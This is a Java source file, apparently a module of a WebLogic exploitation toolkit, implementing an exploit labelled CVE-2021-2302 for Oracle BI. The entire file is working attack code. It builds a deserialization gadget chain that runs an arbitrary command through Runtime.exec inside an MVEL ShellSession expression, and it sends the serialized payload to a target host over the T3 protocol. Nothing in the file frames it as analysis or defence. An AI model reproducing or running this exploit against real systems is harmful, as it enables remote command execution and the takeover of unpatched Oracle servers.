package org.weblogic.exploit;

import oracle.security.jps.az.internal.common.principals.UnresolvedPrincipal;
import org.weblogic.exploit.annotation.Gadget;
import org.weblogic.serial.Reflections;
import org.weblogic.serial.Serializer;
import org.weblogic.weblogic.T3ProtocolOperation;

import javax.management.BadAttributeValueExpException;

@Gadget(cve = "CVE-2021-2302", description = "Oracle BI")
public class Coherence6 implements Exploit {
    @Override
    public void exploit(String host, String port, String command) throws Exception {
        UnresolvedPrincipal unresolvedPrincipal = new UnresolvedPrincipal("com.tangosol.coherence.mvel2.sh.ShellSession",
                "java.lang.Runtime.getRuntime().exec('" + command + "');");
        BadAttributeValueExpException badAttribute = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttribute, "val", unresolvedPrincipal);
        T3ProtocolOperation.send(host, port, Serializer.serialize(badAttribute));
    }
}
